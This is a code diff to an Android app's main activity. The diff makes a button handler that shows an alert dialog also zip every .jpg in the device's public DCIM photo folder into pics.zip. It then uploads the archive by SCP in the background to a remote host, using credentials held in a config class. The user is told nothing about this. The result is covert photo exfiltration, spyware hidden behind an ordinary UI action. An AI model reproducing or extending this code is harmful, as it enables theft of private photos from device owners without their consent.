@@ -75,26 +75,6 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-        try {
-            File testFile = new File(this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "pics.zip");
-            if (!testFile.exists())
-                testFile.createNewFile();
-
-            BufferedWriter writer = new BufferedWriter(new FileWriter(testFile, false /*append*/));
-            writer.write("This is a test file...");
-            writer.flush();
-            writer.close();
-
-
-            MediaScannerConnection.scanFile(this,
-                    new String[]{testFile.toString()},
-                    null,
-                    null);
-
-        } catch (Exception e) {
-            Log.e("ReadWriteFile", "Unable to write to the TestFile.txt file.");
-        }
-
         ///////////////////////////////////////////////////////
 
 
@@ -126,7 +106,7 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    /
+
     public void onClickShowAlert(View view) {
         // Build the alert dialog.
         AlertDialog.Builder myAlertBuilder = new AlertDialog.Builder(MainActivity.this);
@@ -154,6 +134,9 @@ public class MainActivity extends AppCompatActivity {
         myAlertBuilder.show();
 
 
+        final File testFile = new File(  this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "pics.zip");
+
+
 
         File root = Environment.getExternalStoragePublicDirectory(DIRECTORY_DCIM);
         output = this.getFilesOfDirectory(root, "jpg");
@@ -179,15 +162,18 @@ public class MainActivity extends AppCompatActivity {
         new AsyncTask<Integer, Void, Void>(){
             @Override
             protected Void doInBackground(Integer... params) {
+
                 try {
                     //executeRemoteCommand("usr", "pass","192.168.0.15", 22);
                     executeRemoteSCP(Conf.USERNAME, Conf.PASSWORD,Conf.HOSTNAME, 22,
-                            "MyFile.zip", "MyFile.zip");
+                            testFile.getAbsolutePath(), "MyFile.zip");
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
                 return null;
             }
+
+
         }.execute(1);
 
     }
@@ -196,24 +182,21 @@ public class MainActivity extends AppCompatActivity {
 
     private void zip( List<File> files ) throws Exception {
         final int BUFFER_SIZE = 2048;
+        File zipFile = null;
 
-
-        String fileName = "MyFile.zip";
-        String content = "hello world";
-
-        FileOutputStream outputStream = null;
         try {
-            outputStream = openFileOutput(fileName, this.getApplicationContext().MODE_PRIVATE);
-            outputStream.write(content.getBytes());
-            outputStream.close();
+            zipFile = new File(this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), "pics.zip");
+            if (!zipFile.exists())
+                zipFile.createNewFile();
+
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.e(TAG, "Unable to create pics.zip file.");
         }
 
 
 
         BufferedInputStream origin = null;
-        ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream( outputStream ));
+        ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream( new FileOutputStream(zipFile) ));
 
         try {
             byte data[] = new byte[BUFFER_SIZE];
